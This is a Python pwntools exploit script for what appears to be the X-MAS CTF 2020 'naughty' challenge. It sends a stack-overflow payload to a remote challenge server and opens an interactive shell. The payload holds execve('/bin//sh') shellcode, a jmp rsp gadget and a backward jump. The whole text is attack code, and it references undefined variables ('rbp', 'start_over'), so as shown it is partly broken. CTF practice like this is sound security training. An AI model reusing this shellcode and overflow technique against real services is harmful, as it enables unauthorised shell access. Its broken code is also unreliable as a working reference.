#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['alacritty_gdb']
context.log_level = 'debug'

cookie = 0xe4ff

shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
ret = 0x13371337AABBCCDD

#p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path, "LD_LIBRARY_PATH": "/home/holz/etc/ctf/xmasctf2020/naughty/"})
p = remote('challs.xmas.htsp.ro', 2000)

jmp_rsp = 0x000000000040067f
payload_base = p16(cookie) + p64(rbp)

payload = payload_base
payload += p64(jmp_rsp)
payload += b'\xe9\xbb\xff\xff\xff'
payload = shellcode.ljust(0x2e-6-8, b'\x90')+ p64(start_over) + b'\x90'*6 + payload

p.sendafter('Tell Santa what you want for XMAS', payload)

#gdb.attach(p, 'file ./chall\nb *0x0000000000400637\nb*0x00000000004006a5\nc')
p.interactive()


